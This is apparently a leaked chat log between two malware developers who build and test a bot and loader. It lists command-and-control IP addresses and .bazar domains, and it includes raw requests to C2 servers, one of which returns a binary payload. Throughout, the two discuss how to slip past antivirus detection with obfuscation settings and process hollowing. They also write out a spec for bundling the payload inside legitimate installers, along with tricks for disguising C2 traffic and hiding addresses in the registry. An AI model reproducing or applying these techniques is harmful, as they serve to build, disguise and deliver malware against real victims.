@@ -1,0 +1,1905 @@
+[26.07.21 12:17:36] geraldo: Hi!
+Check it out
+[26.07.21 13:41:03] geraldo: Done!
+```
+https://privatlab.com/s/v/8RRR7e9lMBhVeNlGDZoD
+https://privatlab.com/s/d/8RRR7e9lMBhVeNlGDZoD/4YROm#delete
+```
+[26.07.21 14:48:43] geraldo: Done
+[26.07.21 15:23:48] geraldo: Done
+```
+https://privatlab.com/s/v/kMMMzYdA2pU4xWGLA5JN
+https://privatlab.com/s/d/kMMMzYdA2pU4xWGLA5JN/3blON#delete
+```
+Wild sent it to him.
+[28.07.21 09:12:51] geraldo: Hi, I got it.
+[Jul 28, 07/21 09:18:27] geraldo: I see. I'll clean it up at the next build.
+[28.07.21 10:28:27] geraldo: Will be.
+[28.07.21 11:21:43] geraldo: Got it. It will be done.
+[28.07.21 15:49:18] geraldo: Repeat it, please.
+[28.07.21 15:49:30] geraldo: Repeat it, please.
+[28.07.21 15:49:36] geraldo: No messages came through
+[28.07.21 15:50:07] geraldo: That's it, they came through.
+[28.07.21 16:50:52] geraldo: For the rundll32 mode dll comes out clean, if you change the entry point name to DllRegisterServer it is detected
+[28.07.21 16:51:25] geraldo: Something new
+`https://dyncheck.com/scan/id/364916c4b739aea7a3200ff6f6fed7b5`
+[28.07.21 16:59:52] geraldo: Done
+```
+https://privatlab.com/s/v/yddmV6qGgkt50V7Om2B3
+https://privatlab.com/s/d/yddmV6qGgkt50V7Om2B3/4AX8q#delete
+```
+[28.07.21 17:04:44] geraldo: Yes, I'll look into it now
+[29.07.21 13:59:57] geraldo: The assembly is ready
+```
+https://privatlab.com/s/v/jjjx99gx5QszM8970kRM
+https://privatlab.com/s/d/jjjx99gx5QszM8970kRM/370NR#delete
+```
+I sent it to Wild, too.
+[30.07.21 10:44:54] geraldo: Hi!
+Got it
+[02.08.21 14:02:52] geraldo: Done!
+```
+https://privatlab.com/s/v/xAAaBDb4NrCewz7gR9pk
+https://privatlab.com/s/d/xAAaBDb4NrCewz7gR9pk/dj6kj#delete
+```
+[02.08.21 14:03:35] geraldo: Wild sends build of group g4
+[03.08.21 14:00:35] geraldo: Hey, I've accepted your tasks.
+[03.08.21 16:54:11] geraldo: Hi!
+What addresses?
+[03.08.21 16:56:02] geraldo: Copy that. I'll be right there.
+[03.08.21 17:29:07] geraldo: Done!
+```
+https://privatlab.com/s/v/omm768yk9lI3V0pEzByB
+https://privatlab.com/s/d/omm768yk9lI3V0pEzByB/4ARGx#delete
+```
+[05.08.21 15:17:11] collin: [18:09:17] <kaktus> hello!
+[18:10:58] <kaktus> make raw queries for bot and loader on the new main admin:
+1) for bot with /2 command;
+2) for loader main on bot load
+send them to me with the server responses
+i.e. through postman, curl or similar software
+[18:11:32] <kaktus> with new addresses do these:
+[18:11:34] <kaktus> bot:
+134.122.91.133
+161.35.223.189
+164.90.164.50
+167.172.46.184
+
+LOADER:
+164.90.164.50
+167.172.46.184
+134.122.91.133
+161.35.223.189
+[18:11:45] <kaktus> confirm that got the task
+[05.08.21 15:19:11] geraldo: Hi!
+Got it
+[05.08.21 15:50:05] geraldo: I'm trying it, but it keeps returning "502 Bad Gateway".
+[05.08.21 15:52:01] geraldo: I do it like this:
+`GET http://134.122.91.133/dairy/milk`
+[05.08.21 15:52:50] geraldo: And in table I set Date and Cookie fields in Headers tab
+[05.08.21 16:02:16] collin: https instead of http
+[05.08.21 16:04:28] geraldo: Oh, that's 200 OK
+[05.08.21 16:04:39] collin: in postman?
+[05.08.21 16:04:46] geraldo: Yes.
+[05.08.21 16:05:27] collin: at the bottom of Console, there is a history of requests, go to the needed one, push "Show raw log" and copy it that way
+[05.08.21 16:07:38] geraldo: ``
+GET https://134.122.91.133/dairy/milk
+200
+1396 ms
+Warning: Self signed certificate
+GET /dairy/milk HTTP/1.1
+Date: Thu, 05 Aug 2021 15:55:47 GMT
+Cookie: slxr=PmturdRkaSocZdm03bDbF2qq1QFvm1ZAjHk%2Fh%2FKDBuFI3CEKznxFs1q91a%2FnykgCWtDIJgaMKOK29klxmyIRfly%2F4ZbzojX9RI2JyqnSur2d%2BvqDcKUP1xCKJL66CKUvvcnzlIbRMsqrXlONky5DF2JPZlCDsSYu7O2BuKDemxoGxyslpIVJApKwOGzMxYvc4rERHocCrQoAwRz1xPPyBAxOXTynC4iB3o977Nkg%2BrEW9WHqmHCrYlea3FcFwaJe%2BG4%2BcHompRupOufCer5HN%2FvG65w75AMYNaEyLqyhhEZ7DZe7yZuWLFs6hTJX40AnNk9VxnbbpNhHlXCE2yKj4A%3D%3D
+User-Agent: PostmanRuntime/7.28.3
+Accept: */*
+Postman-Token: 010ea38b-3228-4332-af1b-635479827a19
+Host: 134.122.91.133
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+ 
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Content-Type: text/html; charset=UTF-8
+Content-Length: 2
+Connection: keep-alive
+Date: Thu, 05 Aug 2021 16:04:08 GMT
+Set-Cookie: UP_LIMIT=VcpRgrv5bDhK3SIVL2Oi9KTg5C6lUsBuODOh3azAwmaOkAXbXdNkNxW2DpXMJ51EWKknupOswYskn0JEQESHPNKlJOsKrh8SmgqXYAxdansB0Z7bnKHU0MPkx0nWHd6eviM8gWqiy6yUtNyIMuHPKeu8cFtxyzfjy66hWGNgakTjEHMSJUM7uQcxvnmUWac7uZqZ8drKxL4yyIcXDbBD4DPI3M5UJe7OdaaULFl9OCOvsa5Onn3v8TOFmTv6WEVo
+Set-Cookie: edit_value=358400
+Set-Cookie: GL_ID=qqbbFz2u2WdN92pEc1paV0AxAnXO1s5sAWE8lyx0CmJdJYke3BG0RJrBWJVOomzdhTLnlgT7rpepXtFws5BwYtwzBe5OY9bI3HcaMMq0eD674MR0iKXYi7WakASeJTnHF0qG408WW9RDd0NEVBDGpM7WpAfI2AaHYYGk85rCHSAvE3mkdh6YWdmXX7KU33FsKoQGUf6L91q5n8qLQOCpQ4KzhYABQiTHKXlaSaVa9KH6lTyAL8uvcyhdmQpqkmhq
+Set-Cookie: C_SEED=Q5cE0Tb2vbBuvO9X
+Set-Cookie: start_i=Ko4AFrn0eaBGrUkoe2aUSQjPLFvSS9q2mIgYI0AgLog
+Set-Cookie: DOWN_LIMIT=QwGuzzcBZKTzwSLfob9%2BKjqRD%2BWunc2orwEBcePaYKQMpRnWWycZjJtxq%2Fzs8pAZcVNDfP6hgBE89QmHk14Hw5jQrTHIz%2BiLKTqL%2FLH95DPvQMK%2Bqsw9dK9J3LTDhTXOQlFLB3GjUq8Id5mMenzapS0isoATwzi4c0GsuGkBa7haEIYZxiW2tdXGZv3eFbq%2Bl1rpUrZwpCFxq%2BPM03K51pM3V6W8Jin6YEu2tgLu74%2FepzhpXwOCL4i8NZEUfpAxvtmsRW24PdkFsrT%2ByK%2BF%2FmD9BseYmGzNScAAyBdhHiiXEk0zyAYCYuzAhUCWei5SmO2lXybRUgQWs7VTCXjFxA%3D%3D
+Set-Cookie: A_const=digWkYT9fc4zWprR
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+ 
+OK
+```
+[05.08.21 16:08:09] collin: is this a lowader?
+[05.08.21 16:08:23] geraldo: It's a bot command request
+[05.08.21 16:09:04] collin: + saved
+[05.08.21 16:09:25] geraldo: I'll do it for loader
+[05.08.21 16:18:50] geraldo: ``
+GET https://164.90.164.50/dairy/milk
+200
+36.86 s
+Warning: Self signed certificate
+GET /dairy/milk HTTP/1.1
+Date: Thu, 05 Aug 2021 16:08::12 GMT
+Cookie: a=f7omZODYhAYs5OLD4uirExJkHEr8dtGr2Zf%2B5Z92H%2FKomPVgPe6IMiIC9ByTBfJDYa8I2k8qFnMEMLZXB1Wedzf%2FZKGz3jKG6kxbOMX1Vb5hkPzeK42GWL%2BAGtZTcNDQOMu4V893olwgJT1mAl1abNqcfq3BQOvZlSNc8oRi%2F36ihEHNfYk0hh3kksfJH9XTzSDSp4Lad3dfg%2B2hS3rXNVP02joezrbv6E5OdmiR66mOSXknyuxfH2196Z%2Fq8woNVUPyYvTCzhldFqB3hOtTV8TthMzr6AQUDGNRdpLnK%2Bk1MhozJeknvqM%2BKgl%2BZ6PWrpzKHzAe6NbRhvFAvk7ncg%3D%3D
+User-Agent: PostmanRuntime/7.28.3
+Accept: */*
+Postman-Token: 803fc050-ef59-4e52-97df-05e0736cf77a
+Host: 164.90.164.50
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+ 
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Content-Type: application/octet-stream
+Content-Length: 2485760
+Connection: keep-alive
+Date: Thu, 05 Aug 2021 16:17:13 GMT
+Content-Description: File Transfer
+Content-Disposition: attachment; filename=TsD2x5tdj7
+Content-Transfer-Encoding: binary
+Expires: 0
+Cache-Control: must-revalidate, post-check=0, pre-check=0
+Pragma: public
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+```
+[05.08.21 16:25:06] collin: +
+[05.08.21 16:25:15] collin: why is your bot so big - 2.5 MBytes?
+[05.08.21 16:28:45] collin: how about your additions? I'm interested in "Delay before the first request to the command server" and "Noise network requests" tasks first.
+[05.08.21 16:29:39] collin: also, we got higher actuality of update by command 10 4 - I changed the priority of task 337 to high
+[05.08.21 16:29:56] collin: after these two - next in line take command 10 4
+[05.08.21 16:31:27] collin: what about task 336 - it's been in your work for the second month?
+[05.08.21 16:36:09] geraldo: I compile bot with all possible obfuscator keys.
+I will make delay in the nearest time.
+[05.08.21 16:37:41] geraldo: I don't know where to save the addresses in task 336. I wanted to save somewhere far away in COM-objects, but didn't found yet how to do it.
+[05.08.21 16:39:03] geraldo: I haven't started making noise network queries yet.
+[05.08.21 16:44:02] collin: `In problem 336 I don't know where to save addresses` - just add to registry to HKCU\Software branch section and put it in obfuscated form there
+[05.08.21 16:44:20] collin: And it's only in the Lauder, and now it's not so relevant anymore
+[05.08.21 16:44:49] collin: with the latest DGA2 upgrade
+[05.08.21 16:45:16] collin: make rant lists only in your process
+[05.08.21 16:45:42] collin: that's enough
+[05.08.21 16:47:39] collin: the timelists are in the bot and the lowader
+[06.08.21 19:14:09] collin: hi!
+[06.08.21 19:14:58] collin: 1) on monday make and send me detailed progress report for this week - what tasks you solve, how much time to do each of them took approximately
+[06.08.21 19:15:41] collin: 2) explain me your git - why one commit per week?
+[06.08.21 19:16:59] collin: 3) starting from next week, make a daily detailed redmine report about your work - workload with a breakdown into subtasks, add comments to the tasks, set new ones if needed.
+[06.08.21 19:18:44] collin: the point is - you have a very low rate of rework tasks compared to all the other BC coders, so I need transparency of what and how you do
+[06.08.21 19:19:17] collin: I want to understand if there are bottlenecks, then we'll optimize if there are any
+[06.08.21 19:19:31] collin: confirm receipt
+[06.08.21 19:21:36] geraldo: I got it.
+In git I upload weekly results usually.
+[06.08.21 19:22:00] geraldo: If I write a lot of code, then several times a week.
+[06.08.21 19:22:23] collin: you can not upload - but do different commits, then you can upload everything to the server by one command once a week
+[06.08.21 19:22:59] collin: there's an explanation for each of them - what task, redmine task number - so you can see what code is relevant to what
+[06.08.21 19:23:32] collin: this is described in "instructions for the developer" and "code and assembly design" plus I wrote about it in addition, marked the order of maintenance
+[06.08.21 19:24:12] collin: was there such a thing?
+[06.08.21 19:25:18] geraldo: I understand it. I'm not always able to split commits. Sometimes I do several tasks in parallel. I optimize something, clean it up, refactor.
+[06.08.21 19:27:35] collin: ok, if it's more convenient, if several tasks are in one commit, just list all solved tasks with numbers from redmine in their explanations
+[06.08.21 19:29:22] geraldo: Yes, I'd better write in RELEASE_NOTES.txt what's done.
+[06.08.21 19:29:43] collin: that's by itself but separately
+[06.08.21 19:30:30] collin: you need it in commits to quickly find the required code changes for some functionality
+[06.08.21 19:31:46] collin: as an option - keep two files RELEASE_NOTES.txt and RELEASE_NOTES_GIT.txt for example - the last one with information about commits and their correspondence to tasks
+[06.08.21 19:32:21] collin: plus there's a more detailed breakdown of the task into steps, and in the first one we write only when some atomic entity is implemented as a whole
+[06.08.21 19:32:45] geraldo: That's it, I got it now.
+[06.08.21 19:33:30] collin: but for git - one task can appear in several different edits
+[06.08.21 19:36:11] geraldo: This week I was messing with loader. I had static detection in regsvr32 mode there.
+[06.08.21 19:36:41] geraldo: And I checked carriage translation for script command
+[06.08.21 19:37:51] geraldo: More precisely, a little earlier - on Sat, Sep
+[06.08.21 19:42:06] collin: Please, describe me in details, how much time it took to solve these tasks, what were the difficulties, how did you check them, etc.
+[06.08.21 19:42:15] geraldo: Tasks not yet solved:
+Noise network requests.
+Implement execution of command 10 4 "update".
+To implement first version of "Polymorphism by behavior" functionality.
+I plan to do a delay and update in the near future
+[06.08.21 19:43:10] collin: `I had static detection there in regsvr32` recall ESET or bitdefender was there?
+[06.08.21 19:43:55] geraldo: There were several AVs there. BitDefender was there too.
+I have a lot of tasks there with a "Testing" status. They are basically solved, I just don't remove them yet
+[06.08.21 19:45:02] collin: from testing to Done by yourself in 1-2 weeks
+[06.08.21 19:45:08] collin: even if it was not actually tested in work
+[06.08.21 19:45:45] collin: you are having a hard time with BitDefender, I remember 2 or 3 weeks of work with it over static
+[06.08.21 19:47:09] collin: it took me 2 days at most, it took no more than that for others too
+[06.08.21 19:48:11] geraldo: It's all Gen:Variant.Razy detects.
+[06.08.21 19:48:31] geraldo: If they appear, kill yourself!
+[06.08.21 19:49:29] geraldo: Only now I understand what they are about
+[06.08.21 19:51:34] collin: try noise export, it helps with royal
+[06.08.21 19:52:21] collin: and changing LLVM obfuscation parameters - different for each module
+[06.08.21 19:53:30] collin: you can't take a single module and twist it (without inheriting settings from a project) and make it general for a project
+[06.08.21 19:53:41] collin: I've had that in crypto lately, until I optimized it in detail
+[06.08.21 19:55:01] geraldo: I change obfuscation parameters sometimes. Yes, that helps. Do you often have Gen:Variant.Razy?
+[06.08.21 19:58:35] collin: it happens on crypto - on output crypto
+[06.08.21 19:58:51] collin: in the bk itself less often
+[09.08.21 13:18:00] collin: hi!
+[09.08.21 13:18:26] collin: added some tasks for you in redmayne - take your priorities into account and add them to your work plan
+[09.08.21 13:18:47] geraldo: Hi! Yes, I already saw
+[10.08.21 16:08:13] collin: hi!
+[10.08.21 16:08:34] collin: 1. your path field in GetSystemInfo report shows a command line instead of filename, check it
+[10.08.21 16:08:49] collin: 2. remove messages in Russian from your debug log
+[10.08.21 16:08:59] collin: in both bot and loeder, everything
+[10.08.21 16:13:21] geraldo: Hi!
+Okay
+[10.08.21 16:13:39] geraldo: In Lowader everything is in English
+[10.08.21 16:13:56] collin: So in bot
+[10.08.21 16:14:11] collin: noticed today in git
+[11.08.21 09:54:31] geraldo: hi!
+Would like to go on vacation for a couple of weeks.
+[11.08.21 09:54:36] geraldo: will you let me go?
+[11.08.21 09:55:27] collin: hello!
+[11.08.21 09:55:31] collin: when do you want to go?
+[11.08.21 09:58:05] geraldo: I would like from this Friday inclusive, i.e. from August 13 and for 2 weeks, so that 30 leave.
+[11.08.21 09:59:22] collin: and if you don't go from the beginning of September?
+[11.08.21 09:59:33] collin: yes
+[11.08.21 10:00:45] collin: I'm leaving next week for two weeks
+[11.08.21 10:00:54] collin: too
+[11.08.21 10:01:00] collin: 2 less coders without us
+[11.08.21 10:02:53] geraldo: We have to think about it.
+[11.08.21 16:19:05] collin: hi!
+[11.08.21 16:19:20] collin: what about your vacation - will you postpone it till September?
+[11.08.21 16:20:52] geraldo: September's not convenient.
+At least for a week.
+[11.08.21 16:21:12] geraldo: Until the 20th.
+[11.08.21 16:23:42] geraldo: If you need to make assemblies, I'll try to get in touch
+[11.08.21 16:25:22] collin: what time you can get in touch, when to make?
+[11.08.21 16:26:21] collin: and if it's even later - October-November will not do?
+[11.08.21 16:27:15] geraldo: Nah, I'll be in touch at that time anyway.
+[11.08.21 16:27:37] collin: evenings after 18?
+[11.08.21 16:27:53] collin: and can you collect at that time?
+[11.08.21 16:30:21] geraldo: The problem is this. I'll have to find an access point to get to the Internet. I don't know what kind of Internet there is yet. It seems to be rumored that the Internet there is fine. That is, the problem is not with time, but with the Internet. If anything, I can do the compilation at any time.
+[11.08.21 16:32:09] geraldo: That is, if I have no problems with the Internet, you can go on vacation
+[11.08.21 16:33:44] collin: and when will you know for sure if there will be problems with the internet or not?
+[11.08.21 16:34:23] geraldo: I will check tomorrow closer to the evening. If there will be no Internet, all is canceled(
+[12.08.21 08:51:35] collin: hi!
+[12.08.21 08:51:42] collin: new TOR, medium priority
+[12.08.21 08:51:51] collin: ``
+Loider generic-glue mode.
+"Glue" is a solution to linking a payload with masking software - a legitimate application or software installer into a single executable (exe) file. When the executable runs, the payload and the masking software run simultaneously, with both running in the same process (the payload runs in a separate thread).
+This mode is a modification of generic mode, with the following changes and additions:
+1. Payload in exe format is not used for crypting (gluing).
+2. there are two ways of starting executable file obtained as a result of splicing: with launching of masking software and payload, and with launching of payload only.
+By default, the payload is launched together with the masking software.
+The launch method is specified by the first command line parameter after the slash character: "/%prm_no_soft%", where prm_no_soft is a constant text value which:
+- is set at the stage of building of the Loeder BC;
+- is set as a parameter during the formation of the final executable file by the "Glue" assembly system;
+- is used in the algorithms of the final executive file to determine the way of launching.
+As a payload the module of the BC loeder in the dll format acts.
+The looder must determine its launch method and terminate (after performing its functionality) depending on it:
+- for the "with masking software" method, terminate via return from DllMain().
+- for "without masking software" way - termination with ExitProcess().
+3. When launched using the method "with masking software", the lowader should restart itself using "without masking software" method with minimal delay (1 to 5 seconds), after which it should continue working.
+It is obligatory to add the parameter prm_no_soft to the commands for fixing and subsequent restarting of the loeder module (if used).
+```
+[12.08.21 08:51:57] collin: acknowledge receipt
+[12.08.21 09:00:24] geraldo: Hi, I got it!
+[12.08.21 09:01:11] collin: about your vacation,
+[12.08.21 09:01:23] collin: what's the result - will you get online, what days and times?
+[12.08.21 09:01:49] geraldo: I'm about to find out
+[12.08.21 09:45:32] collin: build for new primary
+[12.08.21 09:45:51] collin: group 22, x64, generic
+[12.08.21 09:46:01] collin: ``
+addresses (domains) of the first stage
+bot:
+141.136.0.244
+64.225.67.59
+45.89.106.80
+64.225.71.185
+
+LOADER:
+45.89.106.80
+64.225.71.185
+141.136.0.244
+64.225.67.59
+
+second stage domains
+bot:
+blackrain15.bazar
+reddew28c.bazar
+bluehail.bazar
+
+lowder:
+whitestorm9p.bazar
+bluecloud21c.bazar
+yellowdownpour81.bazar
+```
+[12.08.21 09:46:05] collin: send it to me
+[12.08.21 09:51:00] geraldo: Copy that.
+[12.08.21 11:08:41] geraldo: All set!
+https://privatlab.com/s/v/4jjMaZGYzWUNQ5EkBy6V
+https://privatlab.com/s/d/4jjMaZGYzWUNQ5EkBy6V/2Wp0o#delete
+[12.08.21 11:11:27] collin: +
+[12.08.21 11:13:47] geraldo: Please, repeat the mission.
+Reloaded browser, all gone(
+[12.08.21 11:14:29] collin: no new, I sent confirmation
+[12.08.21 11:14:36] collin: duplicate old one?
+[12.08.21 11:17:17] geraldo: Well, there's the glue job.)
+[12.08.21 11:17:31] geraldo: Mode - glue.
+I forgot how glue is translated.)
+[12.08.21 11:17:58] collin: ``
+Loeder mode generic-glue.
+"Glue" is a solution to combine a payload with masking software - a legitimate application or software installer into a single executable (exe) file. When the executable runs, the payload and the masking software run simultaneously, with both running in the same process (the payload runs in a separate thread).
+This mode is a modification of generic mode, with the following changes and additions:
+1. Payload in exe format is not used for crypting (gluing).
+2. there are two ways of starting executable file obtained as a result of splicing: with launching of masking software and payload, and with launching of payload only.
+By default, the payload is launched together with the masking software.
+The launch method is specified by the first command line parameter after the slash character: "/%prm_no_soft%", where prm_no_soft is a constant text value which:
+- is set at the stage of building of the Loeder BC;
+- is set as a parameter during the formation of the final executable file by the "Glue" assembly system;
+- is used in the algorithms of the final executive file to determine the way of launching.
+As a payload the module of the BC loeder in the dll format acts.
+The looder must determine its launch method and terminate (after performing its functionality) depending on it:
+- for the "with masking software" method, terminate via return from DllMain().
+- for "without masking software" way - termination with ExitProcess().
+3. When launched using the method "with masking software", the lowader should restart itself using "without masking software" method with minimal delay (1 to 5 seconds), after which it should continue working.
+It is obligatory to add the parameter prm_no_soft to the commands for fixing and subsequent restarting of the loeder module (if used).
+```
+[12.08.21 11:18:20] geraldo: Thank you)
+[12.08.21 12:04:18] collin: starting from next week I'm on vacation, instead of me elroy - for everything that concerns BC
+by the end of this week:
+1) once again study all tasks in redmine bugtracker from those not closed (in work or not started);
+2) ask questions if there will be
+first of all on tasks with priority High.
+[12.08.21 12:04:20] collin: confirm receipt
+[12.08.21 12:05:32] geraldo: received
+[12.08.21 12:07:23] collin: daily detailed reporting to redmine - no more for now
+[12.08.21 12:07:47] collin: in git - keep it up to date
+[12.08.21 12:09:20] geraldo: Everything is clear. I saw the tasks. Now doing noise queries.
+[30.08.21 08:20:22] collin: hi!
+[30.08.21 08:20:32] collin: how are you getting on with refining BC, are there any difficulties/issues?
+[30.08.21 08:36:58] geraldo: hi!
+Did a little digging with the process hollowing technique.
+Found a way to get rid of NtUnmapViewOfSection call.
+Maybe it will be useful for fighting with detects.
+[30.08.21 08:37:32] collin: yeah, I use it too.
+[30.08.21 08:37:39] geraldo: I did tasks from Redmine (not all of them).
+[30.08.21 08:38:17] geraldo: I wrote command line parsers for rundll32, regsvr32
+[30.08.21 08:42:11] geraldo: In RELEASE_NOTES_GIT.txt I wrote short instructions to disable CRT and unnecessary code (from August 1).
+[30.08.21 08:42:32] geraldo: Maybe you'll find something useful.
+[30.08.21 08:42:55] collin: yeah thanks, I'll have a look.
+[30.08.21 08:43:01] geraldo: just finished it
+[30.08.21 08:43:54] collin: what about 336 and 460?
+[30.08.21 08:46:25] geraldo: 460 - finished
+[30.08.21 08:47:34] geraldo: In task 336 saving to disk is not done yet.
+[30.08.21 08:49:12] geraldo: You said then, that this problem is not so actual, so I put it aside for now.
+[30.08.21 08:55:10] geraldo: I'll be there in 3-4 hours if anything
+[30.08.21 09:00:15] collin: ok
+[30.08.21 13:17:20] collin: ``
+Questionnaire - traffic profile in BC.
+1. In what order are the addresses searched in step 1 of the search strategy - always the same or random?
+2. Is there a limit to the size of time-list of 1 step of search strategy? If yes, by what criterion are the addresses removed from it when the limit is reached?
+3. How do you send commands to bot (date signatures in keyer) - via cookies/hedders/maybe both of them in one assembly?
+4. How are cookie/hedger names formed to pass garbage values and commands to the bot (date signature in loader)?
+4.1 Name format (hardcode list dictionary, words+prefixes, random alphanumeric/numeric-letter values generation, etc.)?
+4.2 randomness of names - are new ones generated for each query or - is a list of names generated for build/machine/startup - similar to "Fake Cookies" in the group card, then names are selected from that list for the next query?
+5. Are garbage cookies or headers generated, or both, or does it depend on how the command is passed to the bot / loader signature?
+6. How many garbage cookies/hedders are generated in requests (in what range is a random value)?
+7. What format(s) of garbage cookie / header values are used?
+One format (e.g. - small Latin letters and numbers combination of length in random range from... to...) or different (e.g. integer decimal number, hex value, base64, etc.)?
+```
+[30.08.21 13:17:31] collin: send me your build info by the end of tomorrow
+[30.08.21 13:17:38] geraldo: Okay.
+[30.08.21 13:42:06] collin: there's a new short task in redmayne "Change netdomain parameter in Get SystemInfo report" try to make it fast
+[30.08.21 13:42:29] geraldo: Okay.
+[31.08.21 16:18:12] geraldo: I sent build to Porfirio.
+[31.08.21 16:18:19] collin: +
+[31.08.21 16:18:27] geraldo: Answers to yesterday's questionnaire:
+1. Always the same.
+2. no restriction.
+3. Second parameter of HttpSendRequestA function.
+4.1 A random sequence of short lowercase letters.
+4.2. New random names are generated each time.
+5. No.
+[31.08.21 16:18:27] collin: How's your progress on the questionnaire?
+[31.08.21 16:20:11] collin: `3. Second parameter of function HttpSendRequestA.` - command /date signature is passed in cookie or in other header with prefix X_?
+[31.08.21 16:20:36] collin: `4.2. New random names are generated each time.` - for each request?
+[31.08.21 16:20:56] geraldo: Cookie
+[31.08.21 16:21:04] collin: `5. No.` - i.e. only one command, no cookies or headers with garbage always?
+[31.08.21 16:21:29] geraldo: No trash
+[31.08.21 16:21:35] collin: okay.
+[31.08.21 16:21:40] geraldo: No trash at all
+[31.08.21 16:22:16] geraldo: Random names for each new request.
+[01.09.21 17:58:39] collin: hi!
+[01.09.21 17:58:57] collin: found in your build command RunDLL does not finish by timeout, bot does not send report
+[01.09.21 17:59:06] collin: did Porfirio send you the test case?
+[01.09.21 17:59:20] collin: maybe not all modules, just one
+[01.09.21 18:10:35] geraldo: Hi. Porfirio and I were looking at one bot yesterday that didn't send a report.
+[01.09.21 18:11:39] geraldo: I'll certainly look into it. But I definitely remember debugging that point. That is, in principle, the bot sends me a report if the termination occurs by timeout.
+[01.09.21 18:12:02] geraldo: Can I get this dll for debugging?
+[01.09.21 18:14:57] geraldo: VNCSRV_41534_1.dll
+[01.09.21 18:15:54] collin: ``
+i=``@<(POUI "vd,k
+https://file.io/MWZgelecu918
+```
+[01.09.21 18:17:16] collin: in Parameters, in the builder commands this command:
+[01.09.21 18:17:18] geraldo: got it
+[01.09.21 18:17:28] collin: ``
+DllRegisterServer --id %id% --group g5 --ip 149.3.170.236
+```
+[01.09.21 18:17:40] geraldo: Got it
+[01.09.21 18:17:50] collin: if it completes at once - maybe there is something wrong with vnc-bridge build,
+[01.09.21 18:18:00] collin: try to change last ip address to one of these:
+[01.09.21 18:18:29] collin: 89.41.182.96
+45.42.202.178
+[01.09.21 18:18:36] collin: but after startup there should be a session
+[01.09.21 18:19:00] collin: only check it on the test VM - session goes to the work list right away
+[01.09.21 18:19:10] collin: someone can connect to it by vnts or sops
+[01.09.21 18:19:45] geraldo: Ok. I will make a separate VM
+[01.09.21 18:21:26] collin: you can check with testdll1_X64.dll first
+[01.09.21 18:21:33] collin: from the set to the regulations
+[01.09.21 18:22:21] collin: to make it hang before forced termination in Parameters write: `TestDllMainFunction noexit`
+[01.09.21 18:22:27] collin: maybe it will show up there already
+[01.09.21 18:22:53] geraldo: Got it. I'll check it right now.
+[01.09.21 18:45:41] geraldo: I got it. It's because this dll restarts itself. I'll try to fix it by tomorrow.
+[01.09.21 18:46:03] geraldo: It's not critical. The bot is still running and the process interrupts as well. only the report is not sent.
+[02.09.21 17:22:47] geraldo: I made an assembly for group tst4:
+```
+https://privatlab.com/s/v/er7Zwqx6VJhAeo49Qq97
+https://privatlab.com/s/d/er7Zwqx6VJhAeo49Qq97/4xVm3#delete
+```
+[02.09.21 17:24:01] collin: +
+[02.09.21 17:24:33] collin: did you fix the problem with timeout, does the error show up?
+[02.09.21 17:25:16] geraldo: Fixed it. There was a problem that file wasn't deleted after process termination.
+[02.09.21 17:25:48] geraldo: I didn't expect that when writing the code
+[02.09.21 17:27:48] geraldo: I even replaced line %group% and added IntegrityLevel calculation too.
+[02.09.21 17:46:32] collin: ok
+[02.09.21 17:46:41] collin: you already have it in the build you downloaded?
+[02.09.21 17:46:53] geraldo: yes
+[06.09.21 11:14:39] geraldo: Copy that.
+[07.09.21 11:14:14] geraldo: Hi!
+Bot has 2 detections now: Win.Packed.Mikey-9787477-0, a variant of Win64/Kryptik.BZB trojan.
+[07.09.21 11:14:50] collin: +
+[07.09.21 11:15:10] geraldo: Only kernel32, ntdll, kernelbase are imported
+[07.09.21 11:16:43] geraldo: I haven't disabled CRT for bot.
+LLVM Obfuscator 10 is used in both bot and loader
+[07.09.21 13:27:41] collin: send me actual "get_id_bk" utility for your builds
+[07.09.21 13:27:47] collin: do you have it?
+[07.09.21 13:28:02] geraldo: yes
+[07.09.21 13:37:35] geraldo: ``
+https://privatlab.com/s/v/VDWoXawEqYSpJj8LDZBr
+https://privatlab.com/s/d/VDWoXawEqYSpJj8LDZBr/N0GNX#delete
+```
+[07.09.21 13:39:57] collin: +
+[10.09.21 13:54:28] collin: hello!
+[10.09.21 13:54:58] collin: build group 6
+[10.09.21 13:55:09] collin: x86, generic
+[10.09.21 13:55:13] collin: addresses and bazaars:
+[10.09.21 13:55:16] collin: ``
+addresses (domains) of the first stage
+bot:
+194.15.112.71
+172.83.155.173
+45.42.201.123
+194.135.33.179
+
+LOADER:
+45.42.201.123
+194.135.33.179
+194.15.112.71
+172.83.155.173
+
+second stage domains, bot and loader:
+blackrain15.bazar
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[10.09.21 13:55:26] collin: send wild
+[10.09.21 13:56:35] collin: and write him info - in README.txt or separately, in which process bot BK can masquerade (all variants if different)
+[10.09.21 14:00:09] geraldo: Hi! Only in the evening I will be able to send you build
+[10.09.21 14:00:41] collin: what time?
+[10.09.21 14:00:55] geraldo: After 20:00 MSK
+[10.09.21 14:01:10] collin: sec, let me check.
+[10.09.21 14:01:27] collin: well, after is a very broad term, can you be more precise?
+[10.09.21 14:01:37] collin: 20:30, 21:00...
+[10.09.21 14:01:47] geraldo: until 21:00.
+[10.09.21 14:04:12] collin: stand down then, don't
+[09/13/21 14:13:05] collin: hey!
+[09/13/21 14:13:09] collin: https://privatlab.com/s/v/8RqLxwAz2aul95RJB8qy
+[13.09.21 14:13:17] collin: this is a new task for you "BC mode persistent1", I added the task in redmayne
+[13.09.21 14:13:26] collin: move all revisions, the priority of the work is this:
+[13.09.21 14:13:36] collin: 1) first of all cleaning and fixing critical errors
+2) then the implementation of this new mode
+3) after you've done the new mode - go back to the rest of improvements, taking into account their priorities in shuffle
+[13.09.21 14:13:39] collin: confirm receipt
+[13.09.21 14:58:43] geraldo: hi!
+Got the mission.
+[09/13/1921 15:00:18] geraldo: Got it. I did the error correction tasks and added functions for skipping addresses.
+[13.09.21 15:00:44] collin: Yep.
+[13.09.21 15:00:56] collin: there are 2 addresses squatted
+[13.09.21 15:01:09] collin: ``
+squatting:
+172.16.25.146 ewuqeked.bazar 82.238.231.108
+192.168.11.8 ekxeidyw.bazar 62.86.245.246
+```
